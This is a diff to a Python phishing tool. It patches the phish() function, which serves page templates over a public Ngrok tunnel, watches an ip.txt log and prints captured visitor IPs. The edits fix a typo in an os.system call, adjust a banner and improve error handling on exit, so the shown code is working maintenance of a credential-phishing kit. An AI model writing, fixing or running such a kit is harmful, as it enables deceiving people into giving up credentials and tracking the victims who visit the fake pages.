@@ -252,7 +252,7 @@ def phish(template):
 	{C} Server   : {G} Ngrok
         {C} Port     : {G} {port}
 	
-	{B}.         STARTING SERVERS
+	{B}       STARTING SERVERS
 {G}{"="*25}{Y}  LOGS  {G}{"="*25}{R}""")
 	link = startServicea(template+"/",port)
 	print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
@@ -269,7 +269,7 @@ def phish(template):
 		while True:
 			a = check("ip.txt")
 			if a==True:
-				os.syste;m('cat ip.txt')
+				os.system('cat ip.txt')
 				os.remove('ip.txt')
 				continue
 			else:
@@ -277,9 +277,9 @@ def phish(template):
 	try:
 		ok()
 
-	except Exception:
-		os.system("pkill ngrok php")
-		print("\n{R} Exiting ")
+	except Exception as e:
+		os.system("pkill php")
+		print(f"\n{R} Exiting , Error : {G} {str(e)}")
 		
 
 	exit()
